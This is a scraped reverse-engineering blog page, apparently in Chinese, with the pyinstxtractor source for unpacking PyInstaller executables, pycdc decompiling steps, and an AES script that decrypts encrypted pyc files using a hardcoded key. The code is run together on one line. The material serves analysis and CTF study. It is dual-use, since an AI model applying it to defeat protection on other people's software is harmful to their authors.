3184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369from __future__ import print_functionimport osimport structimport marshalimport zlibimport sysfrom uuid import uuid4 as uniquenameclass CTOCEntry: def __init__(self, position, cmprsdDataSize, uncmprsdDataSize, cmprsFlag, typeCmprsData, name): self.position = position self.cmprsdDataSize = cmprsdDataSize self.uncmprsdDataSize = uncmprsdDataSize self.cmprsFlag = cmprsFlag self.typeCmprsData = typeCmprsData self.name = nameclass PyInstArchive: PYINST20_COOKIE_SIZE = 24 # For pyinstaller 2.0 PYINST21_COOKIE_SIZE = 24 + 64 # For pyinstaller 2.1+ MAGIC = b&#x27;MEI\\014\\013\\012\\013\\016&#x27; # Magic number which identifies pyinstaller def __init__(self, path): self.filePath = path self.pycMagic = b&#x27;\\0&#x27; * 4 self.barePycList = [] # List of pyc&#x27;s whose headers have to be fixed def open(self): try: self.fPtr = open(self.filePath, &#x27;rb&#x27;) self.fileSize = os.stat(self.filePath).st_size except: print(&#x27;[!] Error: Could not open &#123;0&#125;&#x27;.format(self.filePath)) return False return True def close(self): try: self.fPtr.close() except: pass def checkFile(self): print(&#x27;[+] Processing &#123;0&#125;&#x27;.format(self.filePath)) searchChunkSize = 8192 endPos = self.fileSize self.cookiePos = -1 if endPos &lt; len(self.MAGIC): print(&#x27;[!] Error : File is too short or truncated&#x27;) return False while True: startPos = endPos - searchChunkSize if endPos &gt;= searchChunkSize else 0 chunkSize = endPos - startPos if chunkSize &lt; len(self.MAGIC): break self.fPtr.seek(startPos, os.SEEK_SET) data = self.fPtr.read(chunkSize) offs = data.rfind(self.MAGIC) if offs != -1: self.cookiePos = startPos + offs break endPos = startPos + len(self.MAGIC) - 1 if startPos == 0: break if self.cookiePos == -1: print(&#x27;[!] Error : Missing cookie, unsupported pyinstaller version or not a pyinstaller archive&#x27;) return False self.fPtr.seek(self.cookiePos + self.PYINST20_COOKIE_SIZE, os.SEEK_SET) if b&#x27;python&#x27; in self.fPtr.read(64).lower(): print(&#x27;[+] Pyinstaller version: 2.1+&#x27;) self.pyinstVer = 21 # pyinstaller 2.1+ else: self.pyinstVer = 20 # pyinstaller 2.0 print(&#x27;[+] Pyinstaller version: 2.0&#x27;) return True def getCArchiveInfo(self): try: if self.pyinstVer == 20: self.fPtr.seek(self.cookiePos, os.SEEK_SET) # Read CArchive cookie (magic, lengthofPackage, toc, tocLen, pyver) = \\ struct.unpack(&#x27;!8siiii&#x27;, self.fPtr.read(self.PYINST20_COOKIE_SIZE)) elif self.pyinstVer == 21: self.fPtr.seek(self.cookiePos, os.SEEK_SET) # Read CArchive cookie (magic, lengthofPackage, toc, tocLen, pyver, pylibname) = \\ struct.unpack(&#x27;!8sIIii64s&#x27;, self.fPtr.read(self.PYINST21_COOKIE_SIZE)) except: print(&#x27;[!] Error : The file is not a pyinstaller archive&#x27;) return False self.pymaj, self.pymin = (pyver//100, pyver%100) if pyver &gt;= 100 else (pyver//10, pyver%10) print(&#x27;[+] Python version: &#123;0&#125;.&#123;1&#125;&#x27;.format(self.pymaj, self.pymin)) # Additional data after the cookie tailBytes = self.fileSize - self.cookiePos - (self.PYINST20_COOKIE_SIZE if self.pyinstVer == 20 else self.PYINST21_COOKIE_SIZE) # Overlay is the data appended at the end of the PE self.overlaySize = lengthofPackage + tailBytes self.overlayPos = self.fileSize - self.overlaySize self.tableOfContentsPos = self.overlayPos + toc self.tableOfContentsSize = tocLen print(&#x27;[+] Length of package: &#123;0&#125; bytes&#x27;.format(lengthofPackage)) return True def parseTOC(self): # Go to the table of contents self.fPtr.seek(self.tableOfContentsPos, os.SEEK_SET) self.tocList = [] parsedLen = 0 # Parse table of contents while parsedLen &lt; self.tableOfContentsSize: (entrySize, ) = struct.unpack(&#x27;!i&#x27;, self.fPtr.read(4)) nameLen = struct.calcsize(&#x27;!iIIIBc&#x27;) (entryPos, cmprsdDataSize, uncmprsdDataSize, cmprsFlag, typeCmprsData, name) = \\ struct.unpack( \\ &#x27;!IIIBc&#123;0&#125;s&#x27;.format(entrySize - nameLen), \\ self.fPtr.read(entrySize - 4)) name = name.decode(&#x27;utf-8&#x27;).rstrip(&#x27;\\0&#x27;) if len(name) == 0: name = str(uniquename()) print(&#x27;[!] Warning: Found an unamed file in CArchive. Using random name &#123;0&#125;&#x27;.format(name)) self.tocList.append( \\ CTOCEntry( \\ self.overlayPos + entryPos, \\ cmprsdDataSize, \\ uncmprsdDataSize, \\ cmprsFlag, \\ typeCmprsData, \\ name \\ )) parsedLen += entrySize print(&#x27;[+] Found &#123;0&#125; files in CArchive&#x27;.format(len(self.tocList))) def _writeRawData(self, filepath, data): nm = filepath.replace(&#x27;\\\\&#x27;, os.path.sep).replace(&#x27;/&#x27;, os.path.sep).replace(&#x27;..&#x27;, &#x27;__&#x27;) nmDir = os.path.dirname(nm) if nmDir != &#x27;&#x27; and not os.path.exists(nmDir): # Check if path exists, create if not os.makedirs(nmDir) with open(nm, &#x27;wb&#x27;) as f: f.write(data) def extractFiles(self): print(&#x27;[+] Beginning extraction...please standby&#x27;) extractionDir = os.path.join(os.getcwd(), os.path.basename(self.filePath) + &#x27;_extracted&#x27;) if not os.path.exists(extractionDir): os.mkdir(extractionDir) os.chdir(extractionDir) for entry in self.tocList: self.fPtr.seek(entry.position, os.SEEK_SET) data = self.fPtr.read(entry.cmprsdDataSize) if entry.cmprsFlag == 1: data = zlib.decompress(data) # Malware may tamper with the uncompressed size # Comment out the assertion in such a case assert len(data) == entry.uncmprsdDataSize # Sanity Check if entry.typeCmprsData == b&#x27;d&#x27; or entry.typeCmprsData == b&#x27;o&#x27;: # d -&gt; ARCHIVE_ITEM_DEPENDENCY # o -&gt; ARCHIVE_ITEM_RUNTIME_OPTION # These are runtime options, not files continue basePath = os.path.dirname(entry.name) if basePath != &#x27;&#x27;: # Check if path exists, create if not if not os.path.exists(basePath): os.makedirs(basePath) if entry.typeCmprsData == b&#x27;s&#x27;: # s -&gt; ARCHIVE_ITEM_PYSOURCE # Entry point are expected to be python scripts print(&#x27;[+] Possible entry point: &#123;0&#125;.pyc&#x27;.format(entry.name)) if self.pycMagic == b&#x27;\\0&#x27; * 4: # if we don&#x27;t have the pyc header yet, fix them in a later pass self.barePycList.append(entry.name + &#x27;.pyc&#x27;) self._writePyc(entry.name + &#x27;.pyc&#x27;, data) elif entry.typeCmprsData == b&#x27;M&#x27; or entry.typeCmprsData == b&#x27;m&#x27;: # M -&gt; ARCHIVE_ITEM_PYPACKAGE # m -&gt; ARCHIVE_ITEM_PYMODULE # packages and modules are pyc files with their header intact # From PyInstaller 5.3 and above pyc headers are no longer stored # https://github.com/pyinstaller/pyinstaller/commit/a97fdf if data[2:4] == b&#x27;\\r\\n&#x27;: # &lt; pyinstaller 5.3 if self.pycMagic == b&#x27;\\0&#x27; * 4: self.pycMagic = data[0:4] self._writeRawData(entry.name + &#x27;.pyc&#x27;, data) else: # &gt;= pyinstaller 5.3 if self.pycMagic == b&#x27;\\0&#x27; * 4: # if we don&#x27;t have the pyc header yet, fix them in a later pass self.barePycList.append(entry.name + &#x27;.pyc&#x27;) self._writePyc(entry.name + &#x27;.pyc&#x27;, data) else: self._writeRawData(entry.name, data) if entry.typeCmprsData == b&#x27;z&#x27; or entry.typeCmprsData == b&#x27;Z&#x27;: self._extractPyz(entry.name) # Fix bare pyc&#x27;s if any self._fixBarePycs() def _fixBarePycs(self): for pycFile in self.barePycList: with open(pycFile, &#x27;r+b&#x27;) as pycFile: # Overwrite the first four bytes pycFile.write(self.pycMagic) def _writePyc(self, filename, data): with open(filename, &#x27;wb&#x27;) as pycFile: pycFile.write(self.pycMagic) # pyc magic if self.pymaj &gt;= 3 and self.pymin &gt;= 7: # PEP 552 -- Deterministic pycs pycFile.write(b&#x27;\\0&#x27; * 4) # Bitfield pycFile.write(b&#x27;\\0&#x27; * 8) # (Timestamp + size) || hash else: pycFile.write(b&#x27;\\0&#x27; * 4) # Timestamp if self.pymaj &gt;= 3 and self.pymin &gt;= 3: pycFile.write(b&#x27;\\0&#x27; * 4) # Size parameter added in Python 3.3 pycFile.write(data) def _extractPyz(self, name): dirName = name + &#x27;_extracted&#x27; # Create a directory for the contents of the pyz if not os.path.exists(dirName): os.mkdir(dirName) with open(name, &#x27;rb&#x27;) as f: pyzMagic = f.read(4) assert pyzMagic == b&#x27;PYZ\\0&#x27; # Sanity Check pyzPycMagic = f.read(4) # Python magic value if self.pycMagic == b&#x27;\\0&#x27; * 4: self.pycMagic = pyzPycMagic elif self.pycMagic != pyzPycMagic: self.pycMagic = pyzPycMagic print(&#x27;[!] Warning: pyc magic of files inside PYZ archive are different from those in CArchive&#x27;) # Skip PYZ extraction if not running under the same python version if self.pymaj != sys.version_info.major or self.pymin != sys.version_info.minor: print(&#x27;[!] Warning: This script is running in a different Python version than the one used to build the executable.&#x27;) print(&#x27;[!] Please run this script in Python &#123;0&#125;.&#123;1&#125; to prevent extraction errors during unmarshalling&#x27;.format(self.pymaj, self.pymin)) print(&#x27;[!] Skipping pyz extraction&#x27;) return (tocPosition, ) = struct.unpack(&#x27;!i&#x27;, f.read(4)) f.seek(tocPosition, os.SEEK_SET) try: toc = marshal.load(f) except: print(&#x27;[!] Unmarshalling FAILED. Cannot extract &#123;0&#125;. Extracting remaining files.&#x27;.format(name)) return print(&#x27;[+] Found &#123;0&#125; files in PYZ archive&#x27;.format(len(toc))) # From pyinstaller 3.1+ toc is a list of tuples if type(toc) == list: toc = dict(toc) for key in toc.keys(): (ispkg, pos, length) = toc[key] f.seek(pos, os.SEEK_SET) fileName = key try: # for Python &gt; 3.3 some keys are bytes object some are str object fileName = fileName.decode(&#x27;utf-8&#x27;) except: pass # Prevent writing outside dirName fileName = fileName.replace(&#x27;..&#x27;, &#x27;__&#x27;).replace(&#x27;.&#x27;, os.path.sep) if ispkg == 1: filePath = os.path.join(dirName, fileName, &#x27;__init__.pyc&#x27;) else: filePath = os.path.join(dirName, fileName + &#x27;.pyc&#x27;) fileDir = os.path.dirname(filePath) if not os.path.exists(fileDir): os.makedirs(fileDir) try: data = f.read(length) data = zlib.decompress(data) except: print(&#x27;[!] Error: Failed to decompress &#123;0&#125;, probably encrypted. Extracting as is.&#x27;.format(filePath)) open(filePath + &#x27;.encrypted&#x27;, &#x27;wb&#x27;).write(data) else: self._writePyc(filePath, data)def main(): if len(sys.argv) &lt; 2: print(&#x27;[+] Usage: pyinstxtractor.py &lt;filename&gt;&#x27;) else: arch = PyInstArchive(sys.argv[1]) if arch.open(): if arch.checkFile(): if arch.getCArchiveInfo(): arch.parseTOC() arch.extractFiles() arch.close() print(&#x27;[+] Successfully extracted pyinstaller archive: &#123;0&#125;&#x27;.format(sys.argv[1])) print(&#x27;&#x27;) print(&#x27;You can now use a python decompiler on the pyc files within the extracted directory&#x27;) return arch.close()if __name__ == &#x27;__main__&#x27;: main() 使用方法‘ python .\\pyinstxtractor.py .\\xxx.exe ‘ 注意 python 版本 pyc 文件反编译使用方法在当前目录（pycdc.exe 和 pyc 文件都要在）打开 cmd 终端，执行以下指令 ‘ .\\pycdc.exe .\\xxx.pyc &gt; xxx.txt ‘ 出现以下错误的应对方法： ’ Bad Magic ‘：“ 魔数错误 ”，意思是 pyc 文件的 magic number 不对，一般是文件头不对，解决方法是用 010 editor 打开 pyc 文件将文件头更改或者补充 pyc.encrypted 解密使用方法将要解密的 pyc.encrypted 文件放到解密文件目录下执行 pycdecryptor.py12345678910111213141516171819202122232425262728import tinyaesimport zlib CRYPT_BLOCK_SIZE = 16 # 从crypt_key.pyc获取key，也可自行反编译获取key = bytes(&#x27;HelloHiHowAreYou&#x27;, &#x27;utf-8&#x27;) inf = open(&#x27;sign.pyc.encrypted&#x27;, &#x27;rb&#x27;) # 打开加密文件outf = open(&#x27;sign.pyc&#x27;, &#x27;wb&#x27;) # 输出文件 # 按加密块大小进行读取iv = inf.read(CRYPT_BLOCK_SIZE) cipher = tinyaes.AES(key, iv) # 解密plaintext = zlib.decompress(cipher.CTR_xcrypt_buffer(inf.read())) # 补pyc头(最后自己补也行)outf.write(b&#x27;\\x6F\\x0D\\x0D\\x0A\\x00\\x00\\x00\\x00\\x70\\x79\\x69\\x30\\x10\\x01\\x00\\x00&#x27;) # 写入解密数据outf.write(plaintext) inf.close()outf.close()","categories":[{"name":"Python相关","slug":"Python相关","permalink":"http://example.com/categories/Python%E7%9B%B8%E5%85%B3/"}],"tags":[]}],"categories":[{"name":"逆向工程核心原理","slug":"逆向工程核心原理","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"},{"name":"DLL注入","slug":"逆向工程核心原理/DLL注入","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/DLL%E6%B3%A8%E5%85%A5/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/categories/WriteUp/"},{"name":"Re","slug":"WriteUp/Re","permalink":"http://example.com/categories/WriteUp/Re/"},{"name":"逆向相关","slug":"逆向相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3/"},{"name":"工具相关","slug":"逆向相关/工具相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3/%E5%B7%A5%E5%85%B7%E7%9B%B8%E5%85%B3/"},{"name":"Python相关","slug":"Python相关","permalink":"http://example.com/categories/Python%E7%9B%B8%E5%85%B3/"},{"name":"算法相关","slug":"算法相关","permalink":"http://example.com/categories/%E7%AE%97%E6%B3%95%E7%9B%B8%E5%85%B3/"},{"name":"逆向学习","slug":"逆向学习","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/"},{"name":"脱壳相关","slug":"逆向学习/脱壳相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/%E8%84%B1%E5%A3%B3%E7%9B%B8%E5%85%B3/"},{"name":"工具相关","slug":"逆向学习/工具相关","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0/%E5%B7%A5%E5%85%B7%E7%9B%B8%E5%85%B3/"},{"name":"PE文件格式","slug":"逆向工程核心原理/PE文件格式","permalink":"http://example.com/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/PE%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/"},{"name":"Misc","slug":"WriteUp/Misc","permalink":"http://example.com/categories/WriteUp/Misc/"},{"name":"栈相关","slug":"栈相关","permalink":"http://example.com/categories/%E6%A0%88%E7%9B%B8%E5%85%B3/"},{"name":"汇编语言学习","slug":"汇编语言学习","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/"},{"name":"2、寄存器（CPU 工作原理）","slug":"汇编语言学习/2、寄存器（CPU-工作原理）","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/2%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%88CPU-%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%89/"},{"name":"1、基础知识","slug":"汇编语言学习/1、基础知识","permalink":"http://example.com/categories/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/1%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"},{"name":"C++反汇编与逆向分析技术揭秘","slug":"C-反汇编与逆向分析技术揭秘","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/"},{"name":"3、观察各种表达式的求值过程","slug":"C-反汇编与逆向分析技术揭秘/3、观察各种表达式的求值过程","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/3%E3%80%81%E8%A7%82%E5%AF%9F%E5%90%84%E7%A7%8D%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E6%B1%82%E5%80%BC%E8%BF%87%E7%A8%8B/"},{"name":"2、认识启动函数，找到用户入口","slug":"C-反汇编与逆向分析技术揭秘/2、认识启动函数，找到用户入口","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/2%E3%80%81%E8%AE%A4%E8%AF%86%E5%90%AF%E5%8A%A8%E5%87%BD%E6%95%B0%EF%BC%8C%E6%89%BE%E5%88%B0%E7%94%A8%E6%88%B7%E5%85%A5%E5%8F%A3/"},{"name":"1、基本数据类型的表现形式","slug":"C-反汇编与逆向分析技术揭秘/1、基本数据类型的表现形式","permalink":"http://example.com/categories/C-%E5%8F%8D%E6%B1%87%E7%BC%96%E4%B8%8E%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E6%8F%AD%E7%A7%98/1%E3%80%81%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E8%A1%A8%E7%8E%B0%E5%BD%A2%E5%BC%8F/"},{"name":"Start","slug":"Start","permalink":"http://example.com/categories/Start/"}],"tags":[]}